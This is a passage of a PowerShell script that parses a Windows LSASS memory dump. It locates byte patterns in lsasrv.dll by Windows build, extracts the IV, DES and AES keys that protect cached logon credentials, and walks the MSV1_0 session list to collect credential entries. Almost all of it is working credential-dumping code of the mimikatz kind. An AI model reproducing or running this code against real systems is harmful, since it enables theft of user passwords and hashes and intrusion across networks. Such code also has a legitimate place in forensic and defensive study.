        $SizeOfHeader = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(4))).replace('-','')
        $SizeOfEntry = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(4))).replace('-','')
        $NumberOfUnloadedModule = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(4))).replace('-','')
        $NumberOfUnloadedModule = [convert]::toint64(($NumberOfUnloadedModule).trim(),16)
    
    
        for($i=0;$i -lt $NumberOfUnloadedModule;$i++)
            {
            $BaseOfImage = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(8))).replace('-','') 
            $SizeOfImage = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(4))).replace('-','') 
            $CheckSum = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(4))).replace('-','') 
            $TimeDateStamp = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(4))).replace('-','') 
            $ModuleNameRva = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(4))).replace('-','') 
    
            $MINIDUMP_UNMODULED = New-Object -Type psobject -Property (@{
                    "BaseAddress" = $BaseOfImage
                    "BaseOfImage" = $BaseOfImage
                    "Size" = $SizeOfImage
                    "SizeOfImage" = $SizeOfImage
                    "CheckSum" = $CheckSum
                    "TimeDateStamp" = $TimeDateStamp
                    "ModuleNameRva" = $ModuleNameRva
                    })
            $UnloadedModules += $MINIDUMP_UNMODULED
            }
    
        foreach($UnloadedModule in $UnloadedModules)
            {
            $fileReader.BaseStream.Seek([convert]::toint64(($UnloadedModule.ModuleNameRva).trim(),16),[System.IO.SeekOrigin]::Begin)  | Out-Null
            $NameLength = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(4))).replace('-','')
            $RawModuleName = ([System.BitConverter]::ToString($fileReader.ReadBytes([convert]::toint64(($NameLength).trim(),16)))).replace('-','')
            $ModuleName = Get-CharsFromHex -HexString $RawModuleName
            Add-Member -InputObject $UnloadedModule -name "ModuleName" -Value $ModuleName -MemberType NoteProperty
        
            $ModuleEndAddress = "{0:x16}" -f ([convert]::toint64(($UnloadedModule.BaseAddress).trim(),16) + [convert]::toint64(($UnloadedModule.Size).trim(),16))
            Add-Member -InputObject $UnloadedModule -name "EndAddress" -Value $ModuleEndAddress -MemberType NoteProperty
            }
        return $UnloadedModules
        }
    
    function Get-MemoryInfoStream
        {
        param(
            $MemoryInfoStream,
            $PathToDMP
        )
        $fileStream = New-Object –TypeName System.IO.FileStream –ArgumentList ($PathToDMP, [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read)
        $fileReader = New-Object –TypeName System.IO.BinaryReader –ArgumentList $fileStream
        $fileReader.BaseStream.Seek([convert]::toint64(($MemoryInfoStream.Location.RVA).trim(),16),[System.IO.SeekOrigin]::Begin) | Out-Null
    
        $SizeOfHeader = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(4))).replace('-','')
        $SizeOfEntry = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(4))).replace('-','')
        $NumberOfMemoryInfo = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(8))).replace('-','')
        $NumberOfMemoryInfo = [convert]::toint64(($NumberOfMemoryInfo).trim(),16)
    
        $MemoryInfos = @()
    
        for($i=0;$i -lt $NumberOfMemoryInfo;$i++)
            {
            $BaseAddress = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(8))).replace('-','') 
            $AllocationBase = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(8))).replace('-','') 
            $AllocationProtect = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(4))).replace('-','') 
            $Alignment = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(4))).replace('-','') 
            $RegionSize = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(8))).replace('-','') 
        
            $RawMState = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(4))).replace('-','')
            $MemoryState = Get-MemoryState -RawMemoryState $RawMState
            $RawProtect = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(4))).replace('-','')
            $Protect =  Get-AllocationProtect -RawAllProtect $RawProtect
            $RawMemoryType = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(4))).replace('-','')
            $MemoryType =  Get-MemoryType -RawMemType $RawMemoryType
            $Alignment2 = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(4))).replace('-','') 
        
            $MemoryInfo = New-Object -Type psobject -Property (@{
                "BaseAddress" = $BaseAddress
                "AllocationBase" = $AllocationBase
                "AllocationProtect" = $AllocationProtect
                "RegionSize" = $RegionSize
                "State" = $MemoryState
                "Protect" = $Protect
                "Type" =  $MemoryType
                })
            $MemoryInfos += $MemoryInfo
            }
    
        return $MemoryInfos
    
        }
    
    function Get-MiscInfoStream
        {
        param(
            $MiscInfoStream,
            $PathToDMP
        )
        $fileStream = New-Object –TypeName System.IO.FileStream –ArgumentList ($PathToDMP, [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read)
        $fileReader = New-Object –TypeName System.IO.BinaryReader –ArgumentList $fileStream
        $fileReader.BaseStream.Seek([convert]::toint64(($MiscInfoStream.Location.RVA).trim(),16),[System.IO.SeekOrigin]::Begin) | Out-Null
    
        $MinidumpMiscInfoFlags1 = New-Object -Type psobject -Property (@{
                "MINIDUMP_MISC1_PROCESS_ID" = 00000001
                "MINIDUMP_MISC1_PROCESS_TIMES" = 00000002
                })
    
        $MinidumpMiscInfo2Flags1 = New-Object -Type psobject -Property (@{
                "MINIDUMP_MISC1_PROCESS_ID" = 00000001
                "MINIDUMP_MISC1_PROCESS_TIMES" = 00000002
                "MINIDUMP_MISC1_PROCESSOR_POWER_INFO" = 00000004
                })
    
        $MiscInfos = @()
    
        if([convert]::toint64(($MiscInfoStream.Location.DataSize).trim(),16) -eq 24)
        {
            $SizeOfInfo = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(4))).replace('-','')
            $Flags1 = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(4))).replace('-','')
            if($Flags1 -and $MinidumpMiscInfoFlags1.MINIDUMP_MISC1_PROCESS_ID)
                {
                $ProcessId = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(4))).replace('-','') 
                }
            else
                {
                $fileReader.BaseStream.Position=($fileReader.BaseStream.Position + 4)
                }
            if($Flags1 -and $MinidumpMiscInfoFlags1.MINIDUMP_MISC1_PROCESS_TIMES)
                {
                $ProcessCreateTime = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(4))).replace('-','')
                $ProcessUserTime =  Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(4))).replace('-','')
                $ProcessKernelTime =  Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(4))).replace('-','')
                }
            else
                {
                $fileReader.BaseStream.Position=($fileReader.BaseStream.Position + 12)
                }
    
            $MiscInfos = New-Object -Type psobject -Property (@{
            "SizeOfInfo" = $SizeOfInfo
            "Flags1" = $Flags1
            "ProcessId" = $ProcessId
            "ProcessCreateTime" = $ProcessCreateTime
            "ProcessUserTime" = $ProcessUserTime
            "ProcessKernelTime" = $ProcessKernelTime
            })
        }
        else
        {
            $SizeOfInfo = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(4))).replace('-','')
            $Flags1 = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(4))).replace('-','')
            if($Flags1 -and $MinidumpMiscInfoFlags1.MINIDUMP_MISC1_PROCESS_ID)
                {
                $ProcessId = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(4))).replace('-','') 
                }
            else
                {
                $fileReader.BaseStream.Position=($fileReader.BaseStream.Position + 4)
                }
            if($Flags1 -and $MinidumpMiscInfoFlags1.MINIDUMP_MISC1_PROCESS_TIMES)
                {
                $ProcessCreateTime = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(4))).replace('-','')
                $ProcessUserTime =  Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(4))).replace('-','')
                $ProcessKernelTime =  Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(4))).replace('-','')
                }
            else
                {
                $fileReader.BaseStream.Position=($fileReader.BaseStream.Position + 12)
                }
           if($Flags1 -and $MinidumpMiscInfoFlags1.MINIDUMP_MISC1_PROCESS_TIMES)
                {
                $ProcessorMaxMhz = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(4))).replace('-','')
                $ProcessorCurrentMhz = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(4))).replace('-','')
                $ProcessorMhzLimit = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(4))).replace('-','')
                $ProcessorMaxIdleState = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(4))).replace('-','')
                $ProcessorCurrentIdleState = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(4))).replace('-','')
                }
            else
                {
                $fileReader.BaseStream.Position=($fileReader.BaseStream.Position + 20)
                }
            $MiscInfos = New-Object -Type psobject -Property (@{
            "SizeOfInfo" = $SizeOfInfo
            "Flags1" = $Flags1
            "ProcessId" = $ProcessId
            "ProcessCreateTime" = $ProcessCreateTime
            "ProcessUserTime" = $ProcessUserTime
            "ProcessKernelTime" = $ProcessKernelTime
            "ProcessorMaxMhz" = $ProcessorMaxMhz
            "ProcessorCurrentMhz" = $ProcessorCurrentMhz
            "ProcessorMhzLimit" = $ProcessorMhzLimit
            "ProcessorMaxIdleState" = $ProcessorMaxIdleState
            "ProcessorCurrentIdleState" = $ProcessorCurrentIdleState
            })
        }
        
        return $MiscInfos
        }
    
    Function Get-MemoryAddress
        {
        param(
            $MemoryAddress,
            $MemoryRanges64,
            $SizeToRead=16,
            $PathToDMP
        )
        
        $MemoryRange = $MemoryRanges64[$MemoryRanges64.End_virutal_Address.IndexOf(($MemoryRanges64.End_virutal_Address | where {[convert]::toint64($_,16) -gt  [convert]::toint64(($MemoryAddress),16)})[0])]
        $FileLocationOfAddress = [convert]::toint64(($MemoryAddress),16) - [convert]::toint64(($MemoryRange.Start_virtual_Address),16)
    
        $fileStream = New-Object –TypeName System.IO.FileStream –ArgumentList ($PathToDMP, [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read)
        $fileReader = New-Object –TypeName System.IO.BinaryReader –ArgumentList $fileStream
        $fileReader.BaseStream.Seek( $FileLocationOfAddress + [convert]::toint64(($MemoryRange.Start_File_Address),16) ,[System.IO.SeekOrigin]::Begin) | Out-Null
        $Result = New-Object -Type psobject -Property (@{
            "Data" = ([System.BitConverter]::ToString($fileReader.ReadBytes($SizeToRead))).replace('-','')  
            "Position" = ($fileReader.BaseStream.Position - $SizeToRead)
            })
        
        return $Result
        }
    
    function Find-PatternInModule
        {
        param(
            $ModuleName,
            $Pattern,
            $BytesRead = 1024
        )
        $Module = $Dump.ModuleListStream | where {$_.Modulename -like "*$ModuleName"}
        $SizeRead = $null
        $MemoryAddress = $Module.BaseAddress
        $PatternData = @()
        $MemoryData = (Get-MemoryAddress -MemoryAddress $MemoryAddress -MemoryRanges64 $Dump.Memory64ListStream -PathToDMP $PathToDMP -SizeToRead ([convert]::toint64($Module.Size,16)))
        if($MemoryData.data -match "$Pattern")
            {
            $PositionOfPattern = $MemoryData.Position + ($MemoryData.data.IndexOf($Pattern)/2)
            $AffectedMemoryRange =$Dump.Memory64ListStream[$Dump.Memory64ListStream.Start_File_Address.IndexOf(($Dump.Memory64ListStream.Start_File_Address | where {[convert]::toint64($_,16) -lt  $PositionOfPattern})[-1])]
            $PatternAddress = "{0:x16}" -f  ([convert]::toint64($AffectedMemoryRange.Start_virtual_Address,16) + ($PositionOfPattern - [convert]::toint64($AffectedMemoryRange.Start_File_Address,16)))
            $PatternData = New-Object -Type psobject -Property (@{
                "Position" = $PositionOfPattern
                "Virtual_Address" = $PatternAddress
                })
            }
        return $PatternData
        }
    
    function Select-CryptoTemplate
        {
        Param(
            [int]$OSVersion,
            $ProcessorArchitecture
        )
    
        $WIN_XP  = 2600
        $WIN_2K3 = 3790
        $WIN_VISTA = 6000
        $WIN_7 = 7600
        $WIN_8 = 9200
        $WIN_BLUE = 9600
        $WIN_10_1507 = 10240
        $WIN_10_1511 = 10586
        $WIN_10_1607 = 14393
        $WIN_10_1703 = 15063
        $WIN_10_1709 = 16299
        $WIN_10_1803 = 17134
        $WIN_10_1809 = 17763
        $WIN_10_1903 = 18362
    
        $Crypto = New-Object -Type psobject -Property (@{
            "Pattern" = $null
            "IV-Offset" = $null
            "DES-Offset" = $null
            "AES-Offset" = $null
            })
    
        if($OSVersion -le $WIN_XP)
            {
                Write-Debug -Message ("Identified OS Version is " + $OSVersion)
                Write-Debug -Message ("Currently no crypto template for the detected OS Version present - Script will be terminated") 
                Start-Sleep -Seconds 3
                Exit
                $Crypto = New-Object -Type psobject -Property (@{
                    "Pattern" = $null
                    "IV-Offset" = $null
                    "DES-Offset" = $null
                    "AES-Offset" = $null
                    })
            }
        elseif($OSVersion -le $WIN_2K3)
            {
                Write-Debug -Message ("Identified OS Version is " + $OSVersion)
                Write-Debug -Message ("Currently no crypto template for the detected OS Version present - Script will be terminated") 
                Start-Sleep -Seconds 3
                Exit
                $Crypto = New-Object -Type psobject -Property (@{
                    "Pattern" = $null
                    "IV-Offset" = $null
                    "DES-Offset" = $null
                    "AES-Offset" = $null
                    })
            }
        elseif($OSVersion -le $WIN_VISTA)
            {
                Write-Debug -Message ("Identified OS Version is " + $OSVersion)
                Write-Debug -Message ("Currently no crypto template for the detected OS Version present - Script will be terminated") 
                Start-Sleep -Seconds 3
                Exit
                $Crypto = New-Object -Type psobject -Property (@{
                    "Pattern" = $null
                    "IV-Offset" = $null
                    "DES-Offset" = $null
                    "AES-Offset" = $null
                    })
            }
        elseif($OSVersion -le $WIN_7)
            {
                Write-Debug -Message ("Identified OS Version is " + $OSVersion)
                Write-Debug -Message ("Crypto template identfied and selected")
                $Crypto = New-Object -Type psobject -Property (@{
                    "Pattern" = "8364243000448B4C2448488B0D"
                    "IV-Offset" = 63
                    "DES-Offset" = -69
                    "AES-Offset" = 25
                    })
            }
        elseif($OSVersion -le $WIN_8)
            {
                Write-Debug -Message ("Identified OS Version is " + $OSVersion)
                Write-Debug -Message ("Crypto template identfied and selected")
                $Crypto = New-Object -Type psobject -Property (@{
                    "Pattern" = "8364243000448B4C2448488B0D"
                    "IV-Offset" = 59
                    "DES-Offset" = -61
                    "AES-Offset" = 25
                    })
            }
        #Value need to be tested - if there is a version number before WIN10 but not Windows Blue
        elseif($OSVersion -le $WIN_BLUE)
            {
                Write-Debug -Message ("Identified OS Version is " + $OSVersion)
                Write-Debug -Message ("Crypto template identfied and selected")
                $Crypto = New-Object -Type psobject -Property (@{
                    "Pattern" = "8364243000448B4C2448488B0D"
                    "IV-Offset" = 62
                    "DES-Offset" = -70
                    "AES-Offset" = 23
                    })
            }
        elseif($OSVersion -le $WIN_10_1507)
            {
                Write-Debug -Message ("Identified OS Version is " + $OSVersion)
                Write-Debug -Message ("Crypto template identfied and selected")
                $Crypto = New-Object -Type psobject -Property (@{
                    "Pattern" = "8364243000488D45E0448B4DD8488D15"
                    "IV-Offset" = 61
                    "DES-Offset" = -73
                    "AES-Offset" = 16
                    })
            }
        elseif($OSVersion -le $WIN_10_1511)
            {
                Write-Debug -Message ("Identified OS Version is " + $OSVersion)
                Write-Debug -Message ("Crypto template identfied and selected")
                $Crypto = New-Object -Type psobject -Property (@{
                    "Pattern" = "8364243000488D45E0448B4DD8488D15"
                    "IV-Offset" = 61
                    "DES-Offset" = -73
                    "AES-Offset" = 16
                    })
            }
        elseif($OSVersion -le $WIN_10_1607)
            {
                Write-Debug -Message ("Identified OS Version is " + $OSVersion)
                Write-Debug -Message ("Crypto template identfied and selected")
                $Crypto = New-Object -Type psobject -Property (@{
                    "Pattern" = "8364243000488D45E0448B4DD8488D15"
                    "IV-Offset" = 61
                    "DES-Offset" = -73
                    "AES-Offset" = 16
                    })
            }
        elseif($OSVersion -lt $WIN_10_1703)
            {
                Write-Debug -Message ("Identified OS Version is " + $OSVersion)
                Write-Debug -Message ("Crypto template identfied and selected")
                $Crypto = New-Object -Type psobject -Property (@{
                    "Pattern" = "8364243000488D45E0448B4DD8488D15"
                    "IV-Offset" = 61
                    "DES-Offset" = -73
                    "AES-Offset" = 16
                    })
            }
        elseif($OSVersion -le $WIN_10_1709)
            {
                Write-Debug -Message ("Identified OS Version is " + $OSVersion)
                Write-Debug -Message ("Crypto template identfied and selected")
                $Crypto = New-Object -Type psobject -Property (@{
                    "Pattern" = "8364243000488D45E0448B4DD8488D15"
                    "IV-Offset" = 61
                    "DES-Offset" = -73
                    "AES-Offset" = 16
                    })
                    
            }
        elseif($OSVersion -le $WIN_10_1803)
            {
                Write-Debug -Message ("Identified OS Version is " + $OSVersion)
                Write-Debug -Message ("Crypto template identfied and selected")
                $Crypto = New-Object -Type psobject -Property (@{
                    "Pattern" = "8364243000488D45E0448B4DD8488D15"
                    "IV-Offset" = 61
                    "DES-Offset" = -73
                    "AES-Offset" = 16
                    })
    
            }
        elseif($OSVersion -lt $WIN_10_1809)
            {
                Write-Debug -Message ("Identified OS Version is " + $OSVersion)
                Write-Debug -Message ("Crypto template identfied and selected")
                $Crypto = New-Object -Type psobject -Property (@{
                    "Pattern" = "8364243000488D45E0448B4DD8488D15"
                    "IV-Offset" = 61
                    "DES-Offset" = -73
                    "AES-Offset" = 16
                    })
            }
        else
            {
                Write-Debug -Message ("Identified OS Version is " + $OSVersion)
                Write-Debug -Message ("Crypto template identfied and selected")
                $Crypto = New-Object -Type psobject -Property (@{
                    "Pattern" = "8364243000488D45E0448B4DD8488D15"
                    "IV-Offset" = 67
                    "DES-Offset" = -89
                    "AES-Offset" = 16
                    })
    
            }
        return $Crypto
        }
    
    function Select-MSVTemplate
        {
        Param(
            [int]$OSVersion,
            $OSArch,
            $LSATimestamp
        )
    
        $WIN_XP  = 2600
        $WIN_2K3 = 3790
        $WIN_VISTA = 6000
        $WIN_7 = 7600
        $WIN_8 = 9200
        $WIN_BLUE = 9600
        $WIN_10_1507 = 10240
        $WIN_10_1511 = 10586
        $WIN_10_1607 = 14393
        $WIN_10_1703 = 15063
        $WIN_10_1709 = 16299
        $WIN_10_1803 = 17134
        $WIN_10_1809 = 17763
        $WIN_10_1903 = 18362
    
        $Pattern = $null
        $offset_to_FirstEntry = $null
        $offset_to_SessionCounter = $null
    
    
        if($OSVersion -le $WIN_XP)
            {
                Write-Debug -Message ("Identified OS Version is " + $OSVersion)
                Write-Debug -Message ("Currently no credential template for the detected OS Version present - Script will be terminated")
                Start-Sleep -Seconds 3
                Exit
            }
        elseif($OSVersion -le $WIN_2K3)
            {
                Write-Debug -Message ("Identified OS Version is " + $OSVersion)
                Write-Debug -Message ("Currently no credential template for the detected OS Version present - Script will be terminated") 
                Start-Sleep -Seconds 3
                Exit  
            }
        elseif($OSVersion -le $WIN_VISTA)
            {
                Write-Debug -Message ("Identified OS Version is " + $OSVersion)
                Write-Debug -Message ("Currently no credential template for the detected OS Version present - Script will be terminated")    
                Start-Sleep -Seconds 3
                Exit
            }
        elseif($OSVersion -le $WIN_7)
            {
                Write-Debug -Message ("Identified OS Version is " + $OSVersion)
                Write-Debug -Message ("Currently no credential template for the detected OS Version present - Script will be terminated")    
                Start-Sleep -Seconds 3
                Exit
            }
        elseif($OSVersion -le $WIN_8)
            {
                Write-Debug -Message ("Identified OS Version is " + $OSVersion)
                Write-Debug -Message ("Currently no credential template for the detected OS Version present - Script will be terminated") 
                Start-Sleep -Seconds 3
                Exit   
            }
        elseif($OSVersion -le $WIN_BLUE)
            {
                Write-Debug -Message ("Identified OS Version is " + $OSVersion)
                Write-Debug -Message ("Credential template identfied and selected")
                $Pattern = "8BDE488D0C5B48C1E105488D05"
                $offset_to_FirstEntry = 16
                $offset_to_SessionCounter = -4
                if($LSATimestamp -gt "139722752")
                    {
                    $ParsingFunction = "Get-MSV1_0_LIST_63"
                    }
                else 
                    {
                    $ParsingFunction = "Get-MSV1_0_LIST_62"
                    }
                $CredParsingFunction = "Parse-PrimaryCredential"
            
            }
        elseif($OSVersion -le $WIN_10_1507)
            {
                Write-Debug -Message ("Identified OS Version is " + $OSVersion)
                Write-Debug -Message ("Credential template identfied and selected")
            $Pattern = "33FF4189374C8BF34585C074"
            $offset_to_FirstEntry = 16
            $offset_to_SessionCounter = -4
            $ParsingFunction = "Get-MSV1_0_LIST_63"
            $CredParsingFunction = "Parse-PrimaryCredential-Win10-old"
            }
        elseif($OSVersion -le $WIN_10_1511)
            {
                Write-Debug -Message ("Identified OS Version is " + $OSVersion)
                Write-Debug -Message ("Credential template identfied and selected")
            $Pattern = "33FF4189374C8BF34585C074"
            $offset_to_FirstEntry = 16
            $offset_to_SessionCounter = -4
            $ParsingFunction = "Get-MSV1_0_LIST_63"
            $CredParsingFunction = "Parse-PrimaryCredential-Win10"
            
            }
        elseif($OSVersion -le $WIN_10_1607)
            {
                Write-Debug -Message ("Identified OS Version is " + $OSVersion)
                Write-Debug -Message ("Credential template identfied and selected")
            $Pattern = "33FF4189374C8BF34585C074"
            $offset_to_FirstEntry = 16
            $offset_to_SessionCounter = -4
            $ParsingFunction = "Get-MSV1_0_LIST_63"
            $CredParsingFunction = "Parse-PrimaryCredential-Win10-1607"    
            }
        elseif($OSVersion -le $WIN_10_1703)
            {
                Write-Debug -Message ("Identified OS Version is " + $OSVersion)
                Write-Debug -Message ("Credential template identfied and selected")
            $Pattern = "33FF458937488BF34585C974"
            $offset_to_FirstEntry = 23
            $offset_to_SessionCounter = -4
            $ParsingFunction = "Get-MSV1_0_LIST_63"
            $CredParsingFunction = "Parse-PrimaryCredential-Win10-1607"
            }
        elseif($OSVersion -le $WIN_10_1709)
            {
                Write-Debug -Message ("Identified OS Version is " + $OSVersion)
                Write-Debug -Message ("Credential template identfied and selected")
            $Pattern = "33FF458937488BF34585C974"
            $offset_to_FirstEntry = 23
            $offset_to_SessionCounter = -4
            $ParsingFunction = "Get-MSV1_0_LIST_63"
            $CredParsingFunction = "Parse-PrimaryCredential-Win10-1607"
            }
        elseif($OSVersion -le $WIN_10_1803)
            {
                Write-Debug -Message ("Identified OS Version is " + $OSVersion)
                Write-Debug -Message ("Credential template identfied and selected")
            $Pattern = "33FF4189374C8BF34585C974"
            $offset_to_FirstEntry = 23
            $offset_to_SessionCounter = -4
            $ParsingFunction = "Get-MSV1_0_LIST_63"
            $CredParsingFunction = "Parse-PrimaryCredential-Win10-1607"
            }
        elseif($OSVersion -le $WIN_10_1809)
            {
                Write-Debug -Message ("Identified OS Version is " + $OSVersion)
                Write-Debug -Message ("Credential template identfied and selected")
            $Pattern = "33FF4189374C8BF34585C974"
            $offset_to_FirstEntry = 23
            $offset_to_SessionCounter = -4
            $ParsingFunction = "Get-MSV1_0_LIST_63"
            $CredParsingFunction = "Parse-PrimaryCredential-Win10-1607"
            }
        else
            {
                Write-Debug -Message ("Identified OS Version is " + $OSVersion)
                Write-Debug -Message ("Credential template identfied and selected")
            $Pattern = "33FF4189374C8BF34585C074"
            $offset_to_FirstEntry = 23
            $offset_to_SessionCounter = -4
            $ParsingFunction = "Get-MSV1_0_LIST_63"
            $CredParsingFunction = "Parse-PrimaryCredential-Win10-1607"
            }
    
        $MSVTemp = New-Object -Type psobject -Property (@{
            Pattern = $Pattern
            FstEntry = $offset_to_FirstEntry
            SessionNo = $offset_to_SessionCounter
            ParsingFunction = $ParsingFunction
            CredParsingFunction = $CredParsingFunction
            })
        return $MSVTemp
    
        }
    
    Function Get-CryptoData
        {
        Param(
            $PathToDMP,
            $Dump
        )
    
        $CryptoTemplate = Select-CryptoTemplate -OSVersion ([convert]::toint64($Dump.SystemInfoStream.BuildNumber,16)) -OSArch $Dump.SystemInfoStream.ProcessorArchitecture
        $PatternAddress = Find-PatternInModule -ModuleName "lsasrv.dll" -Pattern $CryptoTemplate.Pattern
        
        if ($PatternAddress -eq $Null) {
            Write-Debug -Message ("Crypto Pattern not found - Script will be terminated")
            Start-Sleep -Seconds 2
            exit
        }
        


        $IVPointerData = Get-MemoryAddress -MemoryAddress ("{0:x16}" -f ([convert]::toint64(($PatternAddress.Virtual_Address).trim(),16) + $CryptoTemplate.'IV-Offset')) -MemoryRanges64 $Dump.Memory64ListStream -PathToDMP $PathToDMP -SizeToRead 4
        $IVPointer = Convert-LitEdian -String $IVPointerData.data
        $IVAddress = ("{0:x16}" -f (([convert]::toint64(($PatternAddress.Virtual_Address).trim(),16) + $CryptoTemplate.'IV-Offset') + ([convert]::toint64(($IVPointer).trim(),16)) +4 ))
        $IV = (Get-MemoryAddress -MemoryAddress $IVAddress  -MemoryRanges64 $Dump.Memory64ListStream -PathToDMP $PathToDMP).data
    
        $DESPointerData = Get-MemoryAddress -MemoryAddress ("{0:x16}" -f ([convert]::toint64(($PatternAddress.Virtual_Address).trim(),16) + $CryptoTemplate.'DES-Offset')) -MemoryRanges64 $Dump.Memory64ListStream -PathToDMP $PathToDMP -SizeToRead 4
        $FullDESHandleAddress = ("{0:x16}" -f (([convert]::toint64(($PatternAddress.Virtual_Address).trim(),16) + $CryptoTemplate.'DES-Offset') + ([convert]::toint64((Convert-LitEdian -String $DESPointerData.data).trim(),16)) +4 ))
        $RawDESHandleData = Convert-LitEdian (Get-MemoryAddress -MemoryAddress $FullDESHandleAddress  -MemoryRanges64 $Dump.Memory64ListStream -PathToDMP $PathToDMP -SizeToRead 8).data

        $DESHandle = ("{0:x16}" -f ([convert]::toint64($RawDESHandleData,16) + 80 + 12))
        $DESKey = (Get-MemoryAddress -MemoryAddress $DESHandle  -MemoryRanges64 $Dump.Memory64ListStream -PathToDMP $PathToDMP -SizeToRead 24).data
    
        $AESPointerData = Get-MemoryAddress -MemoryAddress ("{0:x16}" -f ([convert]::toint64(($PatternAddress.Virtual_Address).trim(),16) + $CryptoTemplate.'AES-Offset')) -MemoryRanges64 $Dump.Memory64ListStream -PathToDMP $PathToDMP -SizeToRead 4
        $FullAESHandleAddress = ("{0:x16}" -f (([convert]::toint64(($PatternAddress.Virtual_Address).trim(),16) + $CryptoTemplate.'AES-Offset') + ([convert]::toint64((Convert-LitEdian -String $AESPointerData.data).trim(),16)) +4 ))
        $RawAESHandleData = Convert-LitEdian (Get-MemoryAddress -MemoryAddress $FullAESHandleAddress  -MemoryRanges64 $Dump.Memory64ListStream -PathToDMP $PathToDMP -SizeToRead 8).data
        $AESHandle = ("{0:x16}" -f ([convert]::toint64($RawAESHandleData,16) + 80 + 12))
        $AESKey = (Get-MemoryAddress -MemoryAddress $AESHandle  -MemoryRanges64 $Dump.Memory64ListStream -PathToDMP $PathToDMP -SizeToRead 16).data
    
        $CryptoData = New-Object -Type psobject -Property (@{
            IV = $IV
            DESKey = $DESKey
            AESKey = $AESKey
            })
        return $CryptoData
        }
    
    Function Get-CredentialAddresses
        {
        Param(
                $PathToDMP,
                $Dump
            )
        $MSV = Select-MSVTemplate -OSVersion ([convert]::toint64($Dump.SystemInfoStream.BuildNumber,16)) -OSArch $Dump.SystemInfoStream.ProcessorArchitecture -LSATimestamp ($Dump.ModuleListStream | where {$_.ModuleName -like "*lsasrv.dll*"})
        $PatternAddress = Find-PatternInModule -ModuleName "lsasrv.dll" -Pattern $MSV.Pattern
        if ($PatternAddress -eq $Null) {
            Write-Debug -Message ("Credential Pattern not found - Script will be terminated")
            Start-Sleep -Seconds 2
            exit
        }    
        $SessionPointerAddress = ("{0:x16}" -f (([convert]::toint64(($PatternAddress.Virtual_Address).trim(),16) + $MSV.SessionNo)))
        $SessionPointer = Convert-LitEdian -String (Get-MemoryAddress -MemoryAddress $SessionPointerAddress  -MemoryRanges64 $Dump.Memory64ListStream -PathToDMP $PathToDMP -SizeToRead 4).data 
        $NumberOfSessions = (Get-MemoryAddress -MemoryAddress ("{0:x16}" -f (([convert]::toint64(($PatternAddress.Virtual_Address).trim(),16) + ([convert]::toint64(($SessionPointer).trim(),16) + 4)))) -MemoryRanges64 $Dump.Memory64ListStream -PathToDMP $PathToDMP -SizeToRead 1).data 
        
        $MSVListPointerAddress = ("{0:x16}" -f (([convert]::toint64(($PatternAddress.Virtual_Address).trim(),16) + $MSV.FstEntry)))
        $MSVPointer = Convert-LitEdian -String (Get-MemoryAddress -MemoryAddress $MSVListPointerAddress  -MemoryRanges64 $Dump.Memory64ListStream -PathToDMP $PathToDMP -SizeToRead 4).data 
        $MSVEntry = ("{0:x16}" -f (([convert]::toint64(($MSVListPointerAddress).trim(),16) + ([convert]::toint64(($MSVPointer).trim(),16) + 4))))
        $CredEntries = @()
        do
            {
            $Address = Convert-LitEdian -String (Get-MemoryAddress -MemoryAddress $MSVEntry   -MemoryRanges64 $Dump.Memory64ListStream -PathToDMP $PathToDMP -SizeToRead 8).data
            if($Address -eq "0000000000000000")
                {
                break
                }
            else
                {
                $CredEntries += $Address
                }
            $Address = $Null
            $MSVEntry = ("{0:x16}" -f (([convert]::toint64(($MSVEntry).trim(),16) + 8))) 
            }
        while($i -ne $null)

        $CredData = New-Object -Type psobject -Property (@{
            CredentialEntries = $CredEntries
            MSVListPointer = $MSVListPointerAddress
            MSVPointer = $MSVPointer
            MSVEntry = $MSVEntry
            MSVTemplate = $MSV
            })
        Return $CredData
        }
    
